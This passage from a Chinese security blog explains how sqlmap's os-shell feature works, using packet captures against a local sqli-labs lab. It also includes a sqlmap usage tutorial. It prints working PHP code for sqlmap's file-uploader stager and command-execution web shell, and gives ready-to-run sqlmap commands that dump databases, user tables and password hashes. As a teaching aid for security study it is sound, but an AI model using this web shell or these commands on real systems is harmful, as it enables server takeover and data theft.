<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644916159984-52cce86b-e669-44e6-9650-4f2bdb65bf5a.png" alt="img"></p>
<p>&emsp;&emsp;输入绝对路径</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644916556074-76f3f9ce-c0a2-4342-9f30-3dc49a593091.png" alt="img"></p>
<p>&emsp;&emsp;上传文件</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644916629040-b0f2e43a-0ecf-4d8e-b0d9-ae32fd7e4b34.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644917020197-5f8fd446-32e1-4d14-bd5a-345556dbacd4.png" alt="img"></p>
<p>&emsp;&emsp;建立os shell然后命令执行</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644916589433-b2cc06a6-a63e-4251-8ef9-fdead3822a0f.png" alt="img"></p>
<p>&emsp;&emsp;断开shell，清除上传的文件</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644916667024-b80a7982-d33f-4c60-9620-f8a5e6d10a78.png" alt="img"></p>
<p><strong>这个时候sqlmap主要做了三件事</strong></p>
<ol>
<li><p>进行目标的一个基础信息的探测</p>
</li>
<li><p>上传shell到目标web网站上</p>
</li>
<li><p>退出时删除shell</p>
</li>
</ol>
<h1 id="三、原理分析"><a href="#三、原理分析" class="headerlink" title="三、原理分析"></a>三、原理分析</h1><p>&emsp;&emsp;WireShark捕获数据包，只查看http数据包。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644917358164-31f75e7f-d8fd-420a-aec6-d779f29befca.png" alt="img"></p>
<h2 id="1、sqlmap上传一个具有上传功能的马"><a href="#1、sqlmap上传一个具有上传功能的马" class="headerlink" title="1、sqlmap上传一个具有上传功能的马"></a>1、sqlmap上传一个具有上传功能的马</h2><p>&emsp;&emsp;Sqlmap使用<code>into outfile</code>函数将一个具有上传功能的php文件写到当前网站根目录下</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644918078917-f92f8314-b8f4-44ee-b1ab-0d18c27595c1.png" alt="img"></p>
<p>&emsp;&emsp;追踪http流可以看到内容被url编码了，解开后可以看到是通过<code>into outfile</code>进行文件的写入。<br>&emsp;&emsp;马的内容进行了16进制编码，解开后查看代码就可以发现是一个上传功能的马。  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>	Dumb	Dumb</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;upload&quot;</span>])) &#123;</span><br><span class="line">	<span class="variable">$dir</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;uploadDir&quot;</span>];</span><br><span class="line">	<span class="keyword">if</span> (phpversion()&lt;<span class="string">&#x27;4.1.0&#x27;</span>) &#123;</span><br><span class="line">		<span class="variable">$file</span>=<span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">		@move_uploaded_file(<span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$file</span>=<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">		@move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	@chmod(<span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>,<span class="number">0755</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;File uploaded&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>].<span class="string">&quot; method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=D:\\phpstudy_pro\\WWW\\sql_injection\\sqlilabs\\&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644917703009-d8814ef9-749a-46d3-b964-e864d28c8093.png" alt="img"></p>
<h2 id="2、通过上传的马进行shell的上传"><a href="#2、通过上传的马进行shell的上传" class="headerlink" title="2、通过上传的马进行shell的上传"></a>2、通过上传的马进行shell的上传</h2><p>&emsp;&emsp;追踪http流可以看到body为shell的内容。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644918615916-21e119ca-8e29-47ff-9b47-a0027037d511.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="variable">$c</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">@ini_set(<span class="string">&quot;max_execution_time&quot;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$z</span>=@ini_get(<span class="string">&quot;disable_functions&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$z</span>)) &#123;</span><br><span class="line">	<span class="variable">$z</span>=preg_replace(<span class="string">&quot;/[, ]+/&quot;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">	<span class="variable">$z</span>=explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">	<span class="variable">$z</span>=array_map(<span class="string">&quot;trim&quot;</span>,<span class="variable">$z</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$z</span>=<span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$c</span>.<span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$n</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$z</span>;</span><br><span class="line">	<span class="keyword">return</span> is_callable(<span class="variable">$n</span>)<span class="keyword">and</span>!in_array(<span class="variable">$n</span>,<span class="variable">$z</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(f(<span class="string">&quot;system&quot;</span>)) &#123;</span><br><span class="line">	ob_start();</span><br><span class="line">	system(<span class="variable">$c</span>);</span><br><span class="line">	<span class="variable">$w</span>=ob_get_clean();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(f(<span class="string">&quot;proc_open&quot;</span>)) &#123;</span><br><span class="line">	<span class="variable">$y</span>=proc_open(<span class="variable">$c</span>,<span class="keyword">array</span>(<span class="keyword">array</span>(pipe,r),<span class="keyword">array</span>(pipe,w),<span class="keyword">array</span>(pipe,w)),<span class="variable">$t</span>);</span><br><span class="line">	<span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">while</span>(!feof(<span class="variable">$t</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">		<span class="variable">$w</span>.=fread(<span class="variable">$t</span>[<span class="number">1</span>],<span class="number">512</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	@proc_close(<span class="variable">$y</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(f(<span class="string">&quot;shell_exec&quot;</span>)) &#123;</span><br><span class="line">	<span class="variable">$w</span>=shell_exec(<span class="variable">$c</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(f(<span class="string">&quot;passthru&quot;</span>)) &#123;</span><br><span class="line">	ob_start();</span><br><span class="line">	passthru(<span class="variable">$c</span>);</span><br><span class="line">	<span class="variable">$w</span>=ob_get_clean();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(f(<span class="string">&quot;popen&quot;</span>)) &#123;</span><br><span class="line">	<span class="variable">$x</span>=popen(<span class="variable">$c</span>,r);</span><br><span class="line">	<span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span>(is_resource(<span class="variable">$x</span>)) &#123;</span><br><span class="line">		<span class="keyword">while</span>(!feof(<span class="variable">$x</span>)) &#123;</span><br><span class="line">			<span class="variable">$w</span>.=fread(<span class="variable">$x</span>,<span class="number">512</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	@pclose(<span class="variable">$x</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(f(<span class="string">&quot;exec&quot;</span>)) &#123;</span><br><span class="line">	<span class="variable">$w</span>=<span class="keyword">array</span>();</span><br><span class="line">	exec(<span class="variable">$c</span>,<span class="variable">$w</span>);</span><br><span class="line">	<span class="variable">$w</span>=join(chr(<span class="number">10</span>),<span class="variable">$w</span>).chr(<span class="number">10</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$w</span>=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;pre&gt;<span class="subst">$w</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上述代码实现了os-shell得到了命令后，如何执行命令以及输出执行结果到os-shell中。</p>
<p>&emsp;&emsp;因此我们可以在os-shell中执行命令。</p>
<h2 id="3、shell传参进行命令执行"><a href="#3、shell传参进行命令执行" class="headerlink" title="3、shell传参进行命令执行"></a>3、shell传参进行命令执行</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644927919027-82604e3b-07a7-4e13-8ea5-83b5ae21c8f2.png" alt="img"></p>
<h2 id="4、删除shell"><a href="#4、删除shell" class="headerlink" title="4、删除shell"></a>4、删除shell</h2><p>&emsp;&emsp;执行命令删除shell。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644929621168-ffa87336-00f6-49f5-9571-f4825caf6b27.png" alt="img"></p>
<h1 id="四、os-shell的使用条件"><a href="#四、os-shell的使用条件" class="headerlink" title="四、os-shell的使用条件"></a>四、os-shell的使用条件</h1><ol>
<li><p>数据库用户是dba权限</p>
</li>
<li><p>知道网站的绝对路径</p>
</li>
<li><p>php当中的gpc为off时，php自动转义为关闭状态</p>
</li>
<li><p>就算具备以上3个条件，因为涉及到系统命令，也未必可以执行成功</p>
</li>
</ol>
<h1 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h1><ul>
<li><a href="https://xz.aliyun.com/t/7942">https://xz.aliyun.com/t/7942</a></li>
<li><a href="https://www.cnblogs.com/zzjdbk/p/13951047.html">https://www.cnblogs.com/zzjdbk/p/13951047.html</a></li>
</ul>
]]></content>
      <categories>
        <category>安全工具/安全开发</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap的安装及使用</title>
    <url>/post/f2361d57.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、Sqlmap介绍"><a href="#一、Sqlmap介绍" class="headerlink" title="一、Sqlmap介绍"></a>一、Sqlmap介绍</h1><p>&emsp;&emsp;Sqlmap是一个自动化的sql注入工具，其<strong>主要功能</strong>是<strong>扫描、发现并利用给定url的SQL注入漏洞，内置了很多绕过插件</strong>，支持的数据库是<code>MySQL</code>、<code>Oracle</code>、p<code>ostgreSQL</code>、<code>Microsoft SQL Server</code>、<code>Microsoft Access</code>、<code>IBM DB2</code>、<code>SQLite</code>、<code>Firebird</code>、<code>Sybase</code>和<code>SAP MaxDB</code></p>
<p>&emsp;&emsp;Sqlmap采用了以下5种独特的SQL注入技术</p>
<ol>
<li><p><strong>基于布尔类型的盲注</strong>，即可以根据返回页面判断条件真假的注入</p>
</li>
<li><p><strong>基于时间的盲注</strong>，即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行（即页面返回时间是否增加）来判断</p>
</li>
<li><p><strong>基于报错注入</strong>，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中</p>
</li>
<li><p><strong>联合查询注入</strong>，在可以使用union的情况下的注入</p>
</li>
<li><p><strong>堆查询注入</strong>，可以同时执行多条语句时的注入</p>
</li>
</ol>
<p>&emsp;&emsp;Sqlmap的强大功能包括数据库指纹识别、数据库枚举、数据库提取、访问目标文件系统，并在获取完全的操作权限时实行任意命令。Sqlmap的功能强大到让人惊叹，当常规的注入工具不能利用SQL注入漏洞进行注入时，使用sqlmap会有意想不到的效果</p>
<h1 id="二、安装步骤"><a href="#二、安装步骤" class="headerlink" title="二、安装步骤"></a>二、安装步骤</h1><ol>
<li>首先安装python，并配置好环境变量（D:\python3.8）</li>
<li>官网下载sqlmap并解压，我将解压后的文件夹命名为sqlmap</li>
<li>将sqlmap拷贝到python目录下</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1616669519773-bc31c6a7-4c19-45e0-ab55-8ca9a76334cf.png" alt="img"></p>
<ol start="4">
<li>配置sqlmap的环境变量（D:\python3.8\sqlmap)</li>
<li>打开命令行，输入sqlmap.py即可</li>
</ol>
<h1 id="三、Sqlmap入门"><a href="#三、Sqlmap入门" class="headerlink" title="三、Sqlmap入门"></a>三、Sqlmap入门</h1><h2 id="1、判断是否存在注入"><a href="#1、判断是否存在注入" class="headerlink" title="1、判断是否存在注入"></a>1、判断是否存在注入</h2><p>&emsp;&emsp;拿到一个站点，首先得判断它是否有注入</p>
<p>&emsp;&emsp;假定注入点是<a href="http://127.0.0.1/sql/Less-1/?id=1%EF%BC%8C%E5%88%A4%E6%96%AD%E5%85%B6%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%9A%84%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%9A">http://127.0.0.1/sql/Less-1/?id=1，判断其是否存在注入的命令如下：</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;嫌麻烦输入y，可以加个–batch，所有都默认</p>
<p>&emsp;&emsp;<code>-u</code>或<code>--url</code>指定目标</p>
<p>&emsp;&emsp;显示结果如图所示</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1616765457936-5af3dc06-50f8-4e1b-a484-8301805c4286.png" alt="img"></p>
<p>&emsp;&emsp;还有一种情况，当注入点后面的参数大于等于两个时，需要加双引号，如下所示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sql/Less-1/?id=1&amp;uid=2&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="2、判断文本中的请求是否存在注入"><a href="#2、判断文本中的请求是否存在注入" class="headerlink" title="2、判断文本中的请求是否存在注入"></a>2、判断文本中的请求是否存在注入</h2><p>&emsp;&emsp;从文件中加载HTTP请求，sqlmap可以从一个文本文档中获取HTTP请求，这样就可以不设置其他参数（如cookie，POST数据等等），txt文件中的内容为web数据包（一般可以使用burp抓包），如下图所示</p>
<p>&emsp;&emsp;判断是否存在注入的命令如下图所示，运行后的结果如图所示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -r C:\Users\win7\Desktop\123.txt </span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<code>-r</code>从文件加载HTTP请求</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627374374010-46623e53-281c-48b3-990f-db8072adff53.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627374344835-7d298b4e-c7f2-4f25-99d1-78ad863ffaac.png" alt="img"></p>
<h2 id="3、查询当前用户下的所有数据库"><a href="#3、查询当前用户下的所有数据库" class="headerlink" title="3、查询当前用户下的所有数据库"></a>3、查询当前用户下的所有数据库</h2><p>&emsp;&emsp;该命令是确定网站存在注入后，用户查询当前用户下所有的数据库，如下所示。如果当前用户有权限读取包含所有数据库列表信息的表，使用该命令就可以列出所有数据库，如图所示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --dbs</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1616816250492-d492e977-e28a-4ca2-8c22-dff225cbf5fc.png" alt="img"></p>
<h2 id="4、获取数据库中的表名"><a href="#4、获取数据库中的表名" class="headerlink" title="4、获取数据库中的表名"></a>4、获取数据库中的表名</h2><p>&emsp;&emsp;该命令的作用是查询完数据库后，查询指定数据库中的所有的表名，如下所示。如果在该命令中不加入-D参数来指定某一个具体的数据库，那么sqlmap会列出数据库中所有的表，如图所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 -D security --tables</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<code>-D</code> DB，要进行枚举的数据库名</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1616816515018-4dd46e12-f342-44b3-8381-a17e097086e6.png" alt="img"></p>
<h2 id="5、获取表中的字段名"><a href="#5、获取表中的字段名" class="headerlink" title="5、获取表中的字段名"></a>5、获取表中的字段名</h2><p>&emsp;&emsp;该命令的作用是查询完表名后，查询该表中所有的字段名，如下所示。运行该命令的结果如图所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 -D security -T users --columns</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<code>-T</code> TBL，要进行枚举的数据库表</p>
<p>&emsp;&emsp;<code>--columns</code>枚举DBMS数据库表列</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1616816731609-9aed7c90-0c15-49dc-ae36-f36665669a7b.png" alt="img"></p>
<h2 id="6、获取字段内容"><a href="#6、获取字段内容" class="headerlink" title="6、获取字段内容"></a>6、获取字段内容</h2><p>&emsp;&emsp;该命令的作用是查询完字段名之后，获取该字体中具体的数据信息，如下所示。运行该命令的结果如图所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 -D security -T users -C id,password,username --dump</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<code>-C</code> COL，要进行枚举的数据库列</p>
<p>&emsp;&emsp;<code>--dump</code> 转储数据库管理系统的数据库中的表项</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1616817122998-49bf432a-ecfa-4dc6-bc04-a574e3cf00ab.png" alt="img"></p>
<h2 id="7、获取数据库中所有的用户"><a href="#7、获取数据库中所有的用户" class="headerlink" title="7、获取数据库中所有的用户"></a>7、获取数据库中所有的用户</h2><p>&emsp;&emsp;该命令的作用是列出所有数据库的所有用户，如下所示。在当前用户有权限读取包含所有用户的表的权限时，使用该命令就可以列出所有管理用户，运行该命令的结果如图所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --users</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<code>--users</code> 枚举数据库管理系统用户</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1616817191194-4b53fd0f-172d-46d5-92f1-8fa92ea268c3.png" alt="img"></p>
<h2 id="8、获取数据库用户的密码"><a href="#8、获取数据库用户的密码" class="headerlink" title="8、获取数据库用户的密码"></a>8、获取数据库用户的密码</h2><p>&emsp;&emsp;该命令的作用是列出所有数据库的用户的密码，如下所示。如果当前用户有读取包含用户密码的权限，sqlmap会先列举出用户，然后列出Hash，并尝试破解，运行该命令的结果如图所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --passwords</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<code>--passwords</code> 枚举数据库管理系统用户密码哈希</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1616817494376-e717bb6b-9248-4580-8bdb-22cecd1a6735.png" alt="img"></p>
<h2 id="9、获取当前网站数据库的名称"><a href="#9、获取当前网站数据库的名称" class="headerlink" title="9、获取当前网站数据库的名称"></a>9、获取当前网站数据库的名称</h2><p>&emsp;&emsp;该命令的作用是列出当前网站使用的数据库，如下所示，运行该命令的结果如图所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --current-db</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<code>--current-db</code> 检索数据库管理系统当前数据库</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1616817652103-3560d638-dff0-4433-b1ef-a14a500d21ac.png" alt="img"></p>
<h2 id="10、获取当前网站数据库的用户"><a href="#10、获取当前网站数据库的用户" class="headerlink" title="10、获取当前网站数据库的用户"></a>10、获取当前网站数据库的用户</h2><p>&emsp;&emsp;该命令的作用是列出当前网站使用的数据库用户，如下所示，运行该命令的结果如图所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --current-user</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<code>--current-user</code> 检索数据库管理系统的标识</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1616817672378-12e44523-58d3-467c-b52d-3fa65b54a4c2.png" alt="img"></p>
<h2 id="11、报错注入-error-based"><a href="#11、报错注入-error-based" class="headerlink" title="11、报错注入(error based)"></a>11、报错注入(error based)</h2><p>&emsp;&emsp;无法发现报错位，但是数据库出错会爆出来 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u [目标url] --current-db --batch --threads 10 --technique E</span><br></pre></td></tr></table></figure>

<h2 id="12、布尔型注入-boolen-based"><a href="#12、布尔型注入-boolen-based" class="headerlink" title="12、布尔型注入 (boolen based)"></a>12、布尔型注入 (boolen based)</h2><p>&emsp;&emsp;无法发现报错位，数据库被破坏也无法爆出来，但是界面上只会出现有和没有东西两种情况</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u [目标url] --current-db --batch --threads 10 --technique B</span><br></pre></td></tr></table></figure>

<h2 id="13、布尔型时间盲注-time-based"><a href="#13、布尔型时间盲注-time-based" class="headerlink" title="13、布尔型时间盲注 (time based)"></a>13、布尔型时间盲注 (time based)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u [目标url] --current-db --batch --threads 10 --technique T -v 3</span><br></pre></td></tr></table></figure>

<h2 id="14、标准注入（standard-based）"><a href="#14、标准注入（standard-based）" class="headerlink" title="14、标准注入（standard based）"></a>14、标准注入（standard based）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u [目标url] --current-db --batch --threads 10 --technique S</span><br></pre></td></tr></table></figure>

<h2 id="15、联合注入（union-based）"><a href="#15、联合注入（union-based）" class="headerlink" title="15、联合注入（union based）"></a>15、联合注入（union based）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u [目标url] --dbs --batch --threads 10 --technique U</span><br></pre></td></tr></table></figure>

<h2 id="16、POST方面注入"><a href="#16、POST方面注入" class="headerlink" title="16、POST方面注入"></a>16、POST方面注入</h2><p>&emsp;&emsp;<code>--data</code> 后面跟的是post的数据；<code>*</code>号标哪，就是让sqlmap打哪</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u [目标url] --data <span class="string">&quot;uname=admin*&amp;passwd=admin&amp;submit=Submit&quot;</span> --current-db --batch --threads 10 --technique E</span><br></pre></td></tr></table></figure>

<h2 id="17、请求头注入"><a href="#17、请求头注入" class="headerlink" title="17、请求头注入"></a>17、请求头注入</h2><p>&emsp;&emsp;在使用请求头注入的时候，–level必须大于3</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u [目标url] --user-agent=<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0*&quot;</span> --level 4 --dbs --threads 10 --batch --technique E</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;或者使用burp抓包，copy to file保存为shuju.txt，打开文件，在要注入的地方打<code>*</code>，然后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r <span class="string">&quot;root/shuju.txt&quot;</span> --dbs --threads 10 --batch --technique E</span><br><span class="line">sqlmap -u http://sqlilabs.njhack.xyz/Less-20/ --cookie=<span class="string">&quot;uname = admin*;__cfduid=dab97c3dd6a54c5ca485d3e880af5ce271605180690&quot;</span> --level 4 --dbs --threads 10 --batch --technique E </span><br></pre></td></tr></table></figure>

<h1 id="四、sqlmap进阶"><a href="#四、sqlmap进阶" class="headerlink" title="四、sqlmap进阶"></a>四、sqlmap进阶</h1><h2 id="1、–level-5：探测等级"><a href="#1、–level-5：探测等级" class="headerlink" title="1、–level 5：探测等级"></a>1、–level 5：探测等级</h2><p>&emsp;&emsp;参数<code>--level 5</code>指需要执行的测试等级，一共有5个等级（1-5），可以用不同level，<strong>默认是1</strong>。</p>
<p>&emsp;&emsp;Sqlmap使用的payload可以在<code>xml/payload.xml</code>中可以看到，也可以根据相应的格式添加自己的payload，其中5级包含的payload最多，会自动破解出cookie、xff等头部注入。当然，level 5的运行速度也比较慢。</p>
<p>&emsp;&emsp;这个参数会影响测试的注入点，get和post的数据都会进行测试，<code>http cookie</code>在level为2的时候就会测试，<code>http user-agent/referer</code>头在level为3的时候就会进行测试。总之，在不确定那个payload或者参数注入点时，为了保证全面性，为了保证全面性，建议使用高的level值</p>
<h2 id="2、–is-dba：当前用户是否为管理权限"><a href="#2、–is-dba：当前用户是否为管理权限" class="headerlink" title="2、–is-dba：当前用户是否为管理权限"></a>2、–is-dba：当前用户是否为管理权限</h2><p>&emsp;&emsp;该命令用户查看当前账户是否为数据库管理员账户，检测DBMS当前用户是否DBA。如下所示，在本案例中输入该命令，会返回true，结果如图所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --is-dba</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1616817874753-0907a342-158a-45e4-ae3a-a39298d4a20b.png" alt="img"></p>
<h2 id="3、–roles：列出数据库管理员的角色"><a href="#3、–roles：列出数据库管理员的角色" class="headerlink" title="3、–roles：列出数据库管理员的角色"></a>3、–roles：列出数据库管理员的角色</h2><p>&emsp;&emsp;该命令用户查看数据库用户的角色，枚举数据库管理系统用户的角色。如果当前用户有权限读取包含所有用户的表，输入该命令会列举出每个用户的角色，也可以用**-U**参数(-U USER，用来进行枚举的数据库用户 )指定想看哪个用户的角色，结果如图所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --roles</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1616817984721-1d4373ea-74c3-4677-86ba-3af6944dcdd4.png" alt="img"></p>
<h2 id="4、–referer：HTTP-Referer头"><a href="#4、–referer：HTTP-Referer头" class="headerlink" title="4、–referer：HTTP Referer头"></a>4、–referer：HTTP Referer头</h2><p>&emsp;&emsp;Sqlmap可以在请求中伪造http中的referer，当level参数设定为3或者3以上时，会尝试对referer头注入。可以使用referer命令来欺骗。如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --referer http://www.baidu.com</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p>
